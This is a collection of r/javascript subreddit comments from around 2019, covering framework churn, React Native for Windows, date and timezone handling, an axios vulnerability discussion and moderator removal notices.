Was hoping that Collections was going to be another name for tab groups, so I'm disappointed. Why has no one done this yet? Still, this is the ultimate enterprise browser. Use cutting-edge apps (commonly made specifically for Chrome) and ancient legacy apps (commonly made specifically for IE) from the same client.
Hi /u/YasMaf, this post was removed. Since we are a programming subreddit, there are very few instances where visual media is valid content for /r/javascript, including screenshots, demos, etc. Memes and other low-effort content are already prohibited. Please use the `submit a new link` option with a valid source URL, whether it's the project homepage, a blog post, etc. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
Unfortunatly when you are working in a big team, you have to use some standard. And standard enforce you to use a stack like I disribe before. In most web application of today, you will use React, Angular or Vue (or...). This will most likely force you to have as well an API to serve your data. Also if you mind about SEO, you will have to take care about universal rendering, either SSR, pre-render or static page generation. Since you are working in a big team you need to also use a standard for communication between backend and frontend, REST or graphQL. If you are using REST, you will need to implement swagger as well. So most of this dependencies are mainly due to team that need to be able to work together and of course to your target of user.
1. I believe this is already done, though if your ‚Äúall browsers‚Äù means old, out of date ones, you will be waiting forever. 3. Already done. 5. I think this is a huge mistake, as a dom implementation would have to account for every possible variant and need of html, which is no simple spec. The reason vdoms are so practical is because they can safely ignore these things the browser has to track. 6. Only the declarative template engines. Other kinds, like React, are complex objects with html injected into them, not the other way around.
moment-timezone
Ahh this looks nice. Thanks for sharing.
I always find it amusing front-end devs (or devs in general) think JS is the only field that ever "reinvents" things. I guess we should only have iPhones (why have Android? It's the same thing). I guess we should all drive the same SUVs (it does everything and is the most practical). Why program in D when C++ exists. etc.etc. Hell, in the medical field things are progressing so fast that it's literally impossible for a single doctor to keep up with all the research coming out to do X operation just a little better (hence AI having the potential to diagnose issues better than doctors). And yet devs will complain they have to learn a new framework maybe a few times a year üôÑ
It shouldn't have a problem. https://jsfiddle.net/q2zgeh4o/
Always persist your dates in GMT.
Hey thank you for taking the time to go through all of these. I also didn't realise that the apostrophe seems to have turned into whatever it had which made it impossible to copy and paste code, so thank you for pointing that out also!
Thank you for pointing these out. With regard to 15, I did state at the start of the article that some of these are not confusing and will be quite obvious - new developers on the scene may not have considered this though and that is why it has been included.
whoops, thanks for pointing them out!
üëç
Maybe it's time to branch out to other languages/paradigms. Try exploring functional programming, logic programming, a lower level language, or whatever you feel interested in. This stuff may not be new in the absolute sense but some of it will be new to you! :)
The existence of many different high quality, production ready options in front end development is a sign that we are in a golden age is it not?
I like this. This is partially what promoted this discussion. I‚Äôve been doing a deep dive into functional programming and started reading on its roots in lamda calculus and category theory. Both very interesting subjects on their own. I need to do some more reading on logical programming, I watched one video about it and found the approach interesting. I want to learn more about functional programming before going down that rabbit hole.
Check the [HTMLAudioElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAudioElement) documentation. It's just `let audio = new Audio('audio.mp3'); audio.play();`
Even if the ideas behind React have been around for decades, there wasn't a standardized implementation that everyone could just import into their apps. I would definitely prefer to avoid writing my own virtual dom.
Such as? I'm not doubtful, just curious. My only real worry with ECMAScript is that it's getting bloated with more features than it needs.
.Net developers. I'm not kidding either. I was a .Net developer for 5 years and switched to rails then to php and now to be a php developer (hirable) you need to know a js framework (in my area). With .Net you have options and if MS kills a technology you still have C# to fall back on which is why I'm going back. I have old colleagues that are still using a 10 year old technology and are hirable (webforms).
Do you mind expanding on this?
React is a significantly better templating approach. Templating has always been cumbersome, and react has hit a sweet spot after years of iteration.
[Semi-related.](https://www.youtube.com/watch?v=-5wpm-gesOY)
Ha, I love this one.
**TL;DR** it's not JS, it's you It's an experience common to many ex-AS3 devs - you guys moved to JS because Jobsy killed the stack you loved, but deep down you resent it and always found it an inferior choice. And in some way, it is. Flash gave you almost total power and a truly cross platform tool. As long as you don't mind the security risks and Adobe lock-in, and let's face, which AS3 dev does? Myself I went the opposite way - started with JS, moved to AS2 in the wild years when it looked like Flash was going to kill JS, gave up when Flex became the main way to do Flash. Because fuck programming in XML and almost-Java. To each their own.
The javascript date string is timezone aware by default. For example, in the console `new Date()` will show "Mon May 06 2019 18:41:25 GMT-0400 (Eastern Daylight Time)". However, in SQL server for example, a `datetime` field does not have the concept of time zones. In fact, it doesn't know where it is. So you need to use a standard, and that standard is UTC. Javascript will natively display the date in your local timezone, as in reality its value is held as [ms from epoch](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/getTime). Some people think [you don't need moment.js](https://github.com/you-dont-need/You-Dont-Need-Momentjs).
Great work by snyk - looks like none of the axios maintainers gave a shit until snyk made a fuss, and now after _months_ they actually merged the PR.
[I know Python promotes and facilitates using libraries](https://xkcd.com/353/). With ecosystems like npm, this is now common in JS as well. Normally, especially if you're writing a node app, it's perfectly fine to use libraries liberally. However, since it appears you're writing a front end application, I think it's best to bear in mind the consequences of using libraries if you don't absolutely have to. Network load and parse time especially come to mind. Just quickly go over the problem and see if there's a need to use a library, or if it's wiser to create a helper function or a micro lib. Generally, if it takes an hour or so to implement the functionality you want, it's a pretty good idea to do that. There are exceptions of course. You shouldn't write your own stuff if it could pose a security risk (e.g. doing encryption yourself), for example. This is not a call to reinvent the wheel at all times, but that it's always good to balance the pros and cons of using any tool. Sometimes there's no reason to use [this](https://images-na.ssl-images-amazon.com/images/I/71FHJU17djL.jpg) when [this](https://images-na.ssl-images-amazon.com/images/I/41WGxQ5jXuL._SX425_.jpg) will do. Now, time zones are... [bad](https://www.youtube.com/watch?v=-5wpm-gesOY). Use a library, because time zones don't always (read: ever) follow a predictable pattern and the pain of trying tame them has already been felt by many brave souls before us. Best of luck!
Thanks for the thoughtful reply. This is good advice, and I am trying to avoid any adding new libraries if possible.
There's a couple of things I'm thankful for vs. my time as a Flash developer. I used to do a lot of animation and a fair bit of programming in AS3, and I certainly don't miss E4X XML parsing and the complete lack of responsive design. We used to do "responsive" by watching for canvas width changes and moving all of our movie clips x and y values, but it wasn't set up to work out of the box. &amp;#x200B; I liked type checking and OOP, but honestly these days the React style of application architecture has really grown on me. A lot of it is the same though, in the olden days people would sometimes use Singletons in AS3, now we just use Redux.
Technically partial application is not the same thing as currying. Currying takes a single argument at a time while partial application takes 2 or more. Same principle though.
I always found it interesting that they tried to bring AS3 to browsers back in like 2007 but it got shut down.
That‚Äôs what happens, it‚Äôs how we end up with standards for things like wasm, shadow dom, etc
I tried to find them a couple years ago, and, I mean I guess you can find something, but I don't think they contain what you're looking for. I'm guessing, like I was, you're having doubts about how to have a correct folder structures, when to use classes, where to keep view logic and so on. From my experience I can tell you that those answers come in frameworks, not in vanilla JS. In React, Vue and Angular for instance you have a pretty well defined structure that almost forces you to define a component per file, in a similar fashion to how Java forces you to have a file for each class. In just JS there is no such thing, because it's such a versatile language that allows you to write in many different programming paradigms, so it would be limiting to accept only one opinion on what works. You can find books on things like the MVC pattern, but they still don't give you a very specific answer, it's up to you to decide how to implement them. The best thing I can recommend is to surf github and take a peek at how your favourite JS apps or libraries are implemented. You'll find that even experienced programmers vary a lot in terms of code structure and that there's no "secret" they are hiding from you, good luck!
&gt; The majority of the React numbers come from hobbyists I stopped reading there
"What‚Äôs the best way to prove you‚Äôre a good potential engineering hire? Have open source contributions!" Fact or myth? I guess myth.
I‚Äôll still with Electron for the time being. I don‚Äôt want to target just one platform.
Redux is also predictable and highly testable.
I guess the question is, what are you doing that needs to reduce the loading of your store/state? RxJS by itself is a pretty huge library, as is Ngrx... if you eliminate both, there's a lot more package room for a simpler state that has all of your use cases built in. You can also use a store per segment of your application, if you want to work that way, which is closer to the original Flux pattern. Observables and effects are difficult to unit test against. They're also difficult for restoring state and diagnosing pattern issues in your application.
Thanks so much I‚Äôll check them out!
You might find this helpful. https://youtu.be/oKFb2Us9kmg
You're missing the point. It's wonderful that react combined those ideas in such a clean and useful way but it's not _new_. It's a nice repackaging of old concepts and that's what the OP is getting at. We keep ignoring existing solutions outside of our domain and so we end up putting in effort rediscovering those same solutions. That's not necessarily a bad thing either but it is a little frustrating to see.
I understand that it's repackaging old concepts, my argument is that it was beneficial for React to repackage them so other people won't have to. React is a neat layer of abstraction over those decade old concepts that newcomers can reuse without much prior knowledge. I think this is only a problem if the people who created React didn't know about the original concepts and wasted time rediscovering things that are already known. If the creators knew about those concepts and simply implemented them in JS, I'd argue that there's nothing wrong here.
I hear ya. I‚Äôve been coding for almost twenty. I‚Äôve gone from Cold Fusion &gt; Asp Classic &gt; .NET web forms, MVC then into front-end of Bootstrap/ TypeScript/Angular and now React /Redux. At the end of the day it‚Äôs the same thing: data storage, API layer, and front-end. I find React and JavaScript a lot of fun to code in. I love being able to quickly deploy into Google Cloud or AWS. The amount of tech can be frustrating, you just need to tune out the nonsense. I personally have a PluralSite and Udemy account. It helps me demystify most topics without feeling overwhelmed.
Yeah I see what you guys are saying here. I‚Äôm definitely over thinking this and the gross generalizations I made in this comment show that.
Thanks for this answer! &gt;I'm guessing, like I was, you're having doubts about how to have a correct folder structures, when to use classes, where to keep view logic and so on. You're right, that's what I'm looking for. &gt; I can recommend is to surf github and take a peek at how your favourite JS apps or libraries are implemented. I'll do that. It's good advice.
Yeah I can see that. The frontend is still figuring things out, and this is a part of that process.
Hi /u/_BraveSirRobin_, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/itsappleseason, this post was removed. To show off a project (i.e. a finished or semi-finished page, demo, working example, etc.), please include one (1) of the following: * A link to a project page with unbuilt/unminified source code -- sites like GitHub are perfect for this. * A write-up about the development of the project. This can take the form of a blog post, a `README.md` within the project, or a comment on the post itself. The details are up-to-you; you can write from a high-level about your architectural decisions, or you can write on a lower-level about the pros &amp; cons of specific libraries and frameworks you used. The main point is that you're discussing your code -- or your approach in creating the code -- in some way. * A working codepen/jsfiddle/etc. of the code. One of the easiest and most common ways to satisfy this requirement is to simply include a ["Fork me on GitHub"](https://github.com/blog/273-github-ribbons) ribbon your site. Another way to satisfy this requirement is to comment on the post itself, with either a link to a write-up, or with the write-up as the comment. Lastly, instead of all the above, if you just want to showoff your project, feel free to post it to our weekly _"Showoff Saturday"_ post. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/theo258, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/antenarock, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/wilburwilbur, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/DisastrousPhoto, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/redskydav, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Don‚Äôt do that!
I was referring to the website. It looked delicious on my mobile.
Kids in leadership roles are all fucked up.
That's actually super cool!
Is there a Vuejs ‚Äúnative‚Äù equivalent?
React Native can target a lot of platforms.
What kind of game are you trying to make? The [canvas api](https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API) is pretty simple to use if you're just trying to animate squares and circles. Otherwise you could probably take a good example from a game like [cookie clicker](https://github.com/Trixter9994/Cookie-Clicker-Source-Code-Beta) (I wouldn't call the codebase perfect, tbh. But if you're the only person working on it, then code quality isn't the most important thing in the world.) If you want to put it on the internet, [github pages](https://pages.github.com/) makes it pretty easy to do (if you don't want a back-end). I think it just looks for an index.html file and serves it. This is what [trimps](https://github.com/Trimps/Trimps.github.io) does.
I answered this question in a different comment and now that I‚Äôve had a little bit more time to think about it I think the answer is simple. I would just like to see more of us having conversations like this and help push some of the ECMAScript proposals forward. I love these discussions. They help surface some of the pain points we‚Äôre having as JS developers and ultimately will trigger action.
Microsoft has been busy at work with React. This lines up with their work with ReactXP. Their latest Skype uses it for truly cross platform code. I've been tinkering with it for the last week and It's a bit exciting with the possibilities of iOS, Android, Windows, and MacOSx all with one code base. It's a bit ironic that Microsoft is leading the way with porting React-Native to MacOS.
I think that‚Äôs a good way of putting it. I‚Äôm definitely feeling the fatigue (that‚Äôs probably what promoted this post.)
Good point about the way we all think differently. The different approaches each framework takes will trigger new ideas in different people.
Thanks for the links!
Right on. I‚Äôll have to check out their other offerings. I was referring to the article. It makes no mention of them targeting other platforms.
That's how I started, I think it's a great hobby.
Stop thinking of it as tribalism and think of it more as evolution (in the most darwinian-sense of the word). Build tools were ugly and manual to use (grunt, gulp, requirejs, uglify, etc), then webpack came along and changed the game by combining everything they did and put it behind a much smaller configuration. People stopped using all those other tools and webpack became the default (this applies to the majority, obviously there are always outsiders). Now that webpack has been the default for a few years, people are noticing it's kind of a pain in the ass to configure and troubleshoot, and new iterations on the idea popped up (rollup, parcel, etc.). Sure, they're all basically providing the same thing; but they're also serving as alpha testing for the next "default tool". They're allowing us to discover what we really value out of our tooling
NativeScript has support for Vue, also there is Weex. (which is mainly developed by Alibaba, the Chinese e-commerce giant)
I've written plenty of open source software... all free on github, for the most part no one cares about it at all. That being said, having said software on github let me skip my least favorite part of the interview for the current job I have, the coding challenge. Every damn time... "How the hell did I forget what an array is?!" or something basic like that. The hiring manager for this job actually said, "Well we normally do a coding thing, but I read your last two projects on github and your docs on gist and we can skip all of that." Then he asked some questions about the projects and we moved on.
What do you expect from a bunch of developers that feel they need to make their mark in the dev world. It is not trendy anymore to simply use the tools available to their best capacity. Now to gain recognition, people need to *invent* something; it doesn't matter how ludicrous or ineffectual that invention is, as long as it bears the creators name on it.
 [https://developer.mozilla.org/en-US/docs/Web/Web\_Components](https://developer.mozilla.org/en-US/docs/Web/Web_Components)
There is also the elephant in the room of our skies being littered by flying automatons. Imagine never being able to look up at the night sky and see the stars ever again. I still don't see how they can fix that issue no matter how practical the tech becomes.
This churn will continue until the underlying issues plaguing programming in general can be addressed. And that's a long way away, because it requires killing a *lot* of sacred cows.
I know it's hard sometimes, especially if you're like me and spend way too much time investigating "the best" new things rather than just getting work done... but just try to ignore the stuff you don't need. Don't try to learn too many things you "might" need in the future - within reason of course, whatever "too many" means. I don't really get why people go to conferences aside from business/networking reasons. I'm sure the talks are interesting and you get some great tips in all of it. But it's also filling your head with beta-tested paradigms, hence you getting sick of it all. You can usually just watch the really talks you're interested in on youtube later on anyway. If you can't be bothered watching them on youtube, then they probably weren't that important enough for you to spend your time on. The fact that the JS ecosystem has all these fads n shit is a just an inevitable symptom of the fact that it's the most popular mainstream programming language, and seeing the most innovation in libraries/ecosystem/packages right now. Being popular and used for a variety of purposes just means there will be more good + bad packages/frameworks overall in general. None of this has anything to do with JS technically, it's just a symptom of popularity + timing. To put it another way... out of all soft drinks, most stupid people drink coca-cola... not because there's anything stupid about it, it's just the most popular drink to begin with.
Vue native just compiles down to React native, so I don't expect it will be too long üôÇ
React Native works on a bunch of things though. Officially iOS and Android, now Windows, and there's supposed to be a third party plugin for targeting mac OS as well. At that point you're able to write most of your code once for pretty much a whole userbase (I haven't used react native before so I assume you'll need some workarounds for specific targets in a few cases).
Hi /u/nullvoxpopuli, this post was removed because your title included a URL. Please use the `submit a new link` option with a descriptive title. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
Oh yeah the endless "variety" of ui component libraries is ridiculous. I'm trying to choose now and... they all kind of low-key suck, just the same set of very basic features and components. I'm switching from ExtJs which I deeply hate but hot damn, their components are actually really feature-rich compared to 99.9% of the competition.
Anti-gravity only means perpetual-motion if it's a static effect that requires no power to maintain, and yet could be somehow switched.
This is huge - both for react and for Windows. React devs should be pretty excited about this
Just got around to taking a look at this. Definitely looks interesting. Do you have a connection with them in any way or would you happen to know if they would have class scheduling type data? it seems like they are mostly geared towards student data like grades and things that you would find in an LMS or something.
can it target mac and linux?
It can target Mac via Marzipan, I don‚Äôt think Linux is there yet.
This is amazing! Been waiting to put my RN somewhere else!
Wow... literally decided last week to integrate this library into a large project. This is actually *good* news.
So if the source of ddos is maxContentLength, can‚Äôt you manually validate content length with Joi or something else in the backend route handler? Or does it have to be a front end prevention? I know with Vue you can set :maxlength on any input, which should also help,
But they didn't merge it yet. Here it is https://github.com/axios/axios/pull/1485
Thank you for the correction, I had no idea. More reading if anyone's curious: https://stackoverflow.com/questions/218025/what-is-the-difference-between-currying-and-partial-application
Unfortunately axios is dead. It's not surprising that PR fixing this vulnerability was submitted for review over a year ago and hasn't been merged, yet. And most likely won't ever be. There was a [post](https://www.reddit.com/r/javascript/comments/an94xq/axios_needs_maintainers/) on this sub 3 months ago asking for people to help out and a corresponding [issue](https://github.com/axios/axios/issues/1965) was created titled "Project dead?". Lots of people volunteered to help. Maintainer refused to give rights to merge PRs and asked people to label issues and help out answering questions. Then in the comments everyone shared love and hugs and gratitude and all that cool stuff and nothing changed. I mean people starting labeling issues and answering questions and that's great, but they don't have permissions to merge PRs and this is the real bottleneck. Still no maintainers are present. It's sad, but it doesn't look like anything's gonna change for that project.
There are actually very few similarities between react and rn. The markup, styling and animations are different between the two. You could use all the other business logic between proects I Recommend using cordova/phonegap to convert your app to ios and android apps. Phones now days are pretty powerful, and cordova is good enough.
I‚Äôm not sure why this article says it launches; React Native for Windows has been around for years. Now Microsoft is trying to wrap up a rewrite from C# to C++ for the JS bridge and a few other things, which is awesome, but this article doesn‚Äôt highlight that at all. Very weird.
would cordova/phonegap work with the code from react? The primary motivator for using React for the web app is to easily be able to make it mobile-app-friendly with minimal additional coding effort.
Can you develop iOS apps on windows with this? I couldn‚Äôt find info on that.
&gt; With React Native for Windows, Microsoft is reimplementing React Native and rewriting many components in C++ to get maximum performance. It allows developers to target any Windows 10 device, including PCs, tablets, Xbox, mixed reality devices and more. With Microsoft backing the project, these developers will now be able to provide their users with faster, more fluid apps.
&gt; any Windows 10 device Well here's the dealbreaker.
Not surprising Microsoft would invest in that garbage.
So I'll be able to create direct windows Desktop apps with this??
I was frustrated at first when first starting out, but now I feel comfortable picking up pretty much any JS framework and being comfortable with it. I enjoy the competition between the frameworks.
Point to where the bad man touched you.
Converting from react to native it not so hard. When you look at the path native goes there is effort to make native usable ‚Äûeverywhere‚Äú like mobile , web. I think the learning curve will not be so steep when porting from web 2 native. Just jump into the water and check expo.io which has great example and is easy to adopt. I think in the end it all depends on personal preferences and how you can / want handle the tools available.
Looks like it only affects get requests to unknown resources. If your app is doing that, you should be prepared for the worst anyway.
I've only just started learning React Native and I'm excited.
Yes
Do you know where I could find a tutorial or example of how to do this?
Where is the "why do we need dis?" All I see are mechanics - "how do we...". Where is the real life situation where normally the code would be ugly but currying makes it elegant?
Let me ask you something; and this is coming from someone that does develop websites with React and not Wordpress, why do you think so many people are using React or Angular to build websites when Wordpress seems to be so easy and quick for so many people?
Why did you make the jump from Typescrit/Angular to React/Redux?
\- Global await. That was a bad idea. It allowed 90% of whom don't understand execution context to turn everything into async shit show while it should have been 90% sync and 10% async. \- Iterators/generators. I can't event start with it. First it was used under the hood for "for of" but they realized it broke sites when Object/Array prototype was extended. So it required Symbol. I don't even want to talk about what they return. The object {value:...,done:..} is not recycled at all. It returns a new one at each yield encounter. If you want to iterate something 60K times? RIP Garbage Collector. &amp;#x200B; The rest was ok. Proxies were the best imho together with Reflect API. I wasn't expecting that good, quite surprised.
No, this is for developing Windows applications through the React Native API. The iOS platform is handled by regular React Native, but it's build tools and emulators are Mac only.
React Native for Windows was previously only available as an add-on. Having Windows support from Microsoft itself is a totally different beast.
Looks like the article was updated. Judging by the other sources the news here is indeed the new C++ work they have done to replace most of their original C# port (labeled as `vnext`). I'm not quite sure what you mean by add-on though, RNFW has been around for a few years and I know many, including myself, who have shipped software using it. Either way I'm happy to see the C++ work progressing üòÅ
why should they develop new features for deprecated OSes? windows 7 extended support runs out next year and windows 8 in four years.
You can write, style and animate your app with the same code. Many apps are written that way, for instance devhub. They‚Äôre using React-native-web. https://medium.com/@brunolemos/tutorial-how-to-share-code-between-ios-android-web-using-react-native-react-native-web-and-d7bcf78d3a54
&gt;var selectedUsers = users.filter(user =&gt; user.groups.map(group =&gt; selectedDepartments.map(item =&gt; item.key === group))); It works! Thanks! How does the "match" aspect work though? I don't understand
They do. Search for "bell schedule". I don't have direct connection. I just am working in the same space right now.
I'm wondering what the implications of this are, you can now create websites, mobile apps and soon windows applications all in one javascript framework. Do you guys think that this will push more people to adopt JS for creating different apps are you can deploy on multiple devices now without having to re-write much code?
Microsoft supporting it officially is a huge push for javascript as a means to drive native apps. Meanwhile marzipan will culminate ios/macos under the same umbrella, which will add macos to the family. It already exists, but [unofficially](https://github.com/ptmt/react-native-macos). React is currently exploring ways to abstract the last parts that are still host specific, like [events](https://github.com/facebook/react/tree/master/packages/react-events), so that more and more code is fully re-usable. Currently many desktop apps that are released use Electron, which is kind of like shooting flies with cannons. I think the implications are pretty clear by now, everything that can be javascript will be javascript in the coming years.
Nice. Didn't know about that "loophole". My experience is that consulting customers don't care what other projects/products I've done, as they don't apply to them, almost to the point of it being a drawback. Rather, either they trust me or not.
&gt; Does anyone else feel the same way? It's unlikely you're alone in any feeling. Even if you're one in a million, there are a few thousand of you in China alone ;) &gt; Angular is great. React is awesome. Vue is cool. But why all the segregation? Because people, teams, and companies have preferences. Like strong typing your things? Go with Angular. Enjoy simplicity? Go React. Want the new kid on the block that sorta looks like both? Vue's your guy. &gt; Why the constant introduction of ‚Äúnew‚Äù old tech? Because the people making it disagree with a standard and create a new one. If that gets enough traction the project takes off. It's fun and rewarding to them because a lot of us are doing this because we genuinely think it's a lot of fun to work on. &gt; Why is the frontend community constantly reinventing the wheel to solve problems that have already been solved? We're not reinventing wheels. We are refining them. The standards keep changing and adapting, so the software goes along with it. It's like Formula 1. They aren't reinventing cars and wheels all the time, they're adapting to new technologies, new rules, new customer demand, new commercial demand. Things change and we have to change with it. And as a nice bonus it keeps us employed. Imagine having to work with Flash still. Imagine having to program everything in C++ instead of C# or Java or Kotlin or JS or TypeScript or so many others. &gt; IMO this is holding us back from making [more] advancements in software, and more importantly, hindering us from pushing the envelope in frontend development. Can you quantify that? I think the world of front-end is dictated by agreed-upon browser standards and their implementations. If you want to make that go faster you're playing for the wrong team: you could contribute to the W3C and others to help it progress faster. There are SO many browser APIs wildly underused in modern days. There's so much to be done and none of the popular frameworks/libraries are holding you or anyone back. &gt; These are generalized statements. I know a lot of you are working hard to move this community forward. But with that said, we could have had our flying cars by now. I know what you're getting at, but we're tens of millions of developers. Most of us are working for companies that write relatively simple CRUD apps. We don't live in Silicon Valley and we don't work for Elon Musk to make world-changing projects. If you want something like flying cars you'll need to make them commercially viable first: Be a billionaire and buy a F1 team, turn their wings upside down for maximum lift, minimum weight, electrical Tesla engine inside, 4 big fans tilted slightly backward for forwards force. You'll have a $400k Tesla car that can take off and fly starting at 60 mph, after which it'll travel up to 310,96 mph in (roughly) straight lines only: predetermined lines across large areas without people living in them. The car will figure out when it needs to land before it runs out of safe landing areas. Of course, you'll need to have a team of varying PhDs to do the research into the feasibility of it all. Then write up a business proposal. Meet up with /u/ElonMuskOfficial if you can possibly manage to reach out to him, and hope he's up for a flying cars project. Meanwhile, most of us are busy enough being happy and proud users of our frameworks/libraries of choice, and our contributions to the open source community are the incidental upvote at StackOverflow.
I guess the "Windows" part is what he was referring too. &amp;#x200B; All this unnecessary hate.
What's with these surprising Microsoft launches? Damn. They're really trying.
Exciting news! Really glad I picked React instead of the other js frameworks.
I think you've got a much more organized view of programmers in general than actually exists. The vast majority of programmers are working on getting a job done to earn money. If they're like me, they also enjoy that work, but they aren't there to make sacrifices in order to make the programming landscape better through world-wide coordinated effort. Instead, the ones that you're mad at, for "reinventing the wheel", *are* the ones attempting to make the world a better place. They're improving things that are within their grasp. If you think the community should work towards certain goals, *be the change you want to see*. Start those balls rolling. Start making a list of things that the world should be working towards, and then start working towards them. If you say that you're just 1 man and can't do that, then you fall into the very same trap that you're mad at others for falling into.
Can you give a few examples?
Yes!!! And often the attitude goes absurd. I once argued with a guy about why his web-app shouldn‚Äôt be ‚Äòrequired‚Äô to be served from a box with 128 core and 512 GB of RAM. He just couldn‚Äôt wrap his head around the idea that his application didn‚Äôt have to be monolithic ‚Äî especially since it wasn‚Äôt something processor intensive like multi-threaded DSP. It was essentially a CRUD app! But ‚Äúthat‚Äôs the way I‚Äôve always done it‚Äù was the only way he would approach his performance issues.
Ehhh... maybe. I don‚Äôt requiring programmers to know assembly is necessary, for instance. Or even C, really. It‚Äôs not that asemblg and C are useless they just often aren‚Äôt the best trade off between performance and maintenance costs/ease. New technologies are developed for a reason.
awwwwwfuck. i hate when i bet on the wrong horse. welp, on to actually learning Reactive I guess.
[removed]
Big, more conservative, enterprise non-tech companies seem to have a lot of Angular projects in flight. But even these seem to be looking at React for greenfield projects. I don‚Äôt foresee Angular going away anytime soon. Making changes at these big conservative enterprises is like steering the Death Star around a racetrack - painfully bureaucratic and slow. Winforms is still around and going strong, for example. I expect some of these Angular1 apps to be around long after Angular is EOLed and JavaScript itself is barely used anymore.
Will this have an impact on Xamarin? I've avoided it thus far because once MS said they weren't mobile first anymore I feared they would kill it off. I know they probably appeal to different devs (C# vs JS) but are they likely to support both going forward?
Will be interesting to see how this plays out. I suspect ultimately the competition will be Flutter. "Flutter on desktop, a real competitor to Electron" https://medium.com/flutter-community/flutter-on-desktop-a-real-competitor-to-electron-4f049ea6b061
Yea.. Ractive is cool...
I switched jobs and React was the buzzword at the time. I find React syntax easier, less code to write, and more intuitive.
While that's true, if you're not doing anything that's particularly platform specific, if you write your app carefully, it'll run on all platforms with no to little modification. Despite the title, RN for Windows isn't really new. Microsoft has built and supported it for years. Up until now, it had WPF and UWP back ends. I wrote a Reddit reader (well, more like a partial Reddit reader) using RN for Windows, and it mostly just worked as-is on iOS, Android, and MacOS when I tried running it in RN on those platforms.
Hi /u/tjcoolsays, this post was removed. Since we are a programming subreddit, there are very few instances where visual media is valid content for /r/javascript, including screenshots, demos, etc. Memes and other low-effort content are already prohibited. Please use the `submit a new link` option with a valid source URL, whether it's the project homepage, a blog post, etc. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
Snyk is a scam. Interviewed with them and was definitely unimpressed.
No, Angular is dying because it is bloated mess.
Great marketing by snyk for their own product by misusing the term Denial of Service.
Have you tried idangerous swiper ?
Yeah I think the person I responded to was under the impression RN Windows was making full iOS and Android development tools available for Windows, which I was addressing. That's good to hear. Given the disparity between Android and iOS I expected RN Windows and RN MacOS to have more differences. Would it be fair to say you didn't encounter issues because you weren't implementing many native features ie push notifs / camera use?
I‚Äôm going to have to check it out when I get to my laptop! The layout kind of breaks when you go to mobile. Do you have any experience with responsiveness?
[https://vue-native.io/](https://vue-native.io/)
Extending documentation with examples of relatively new packages.
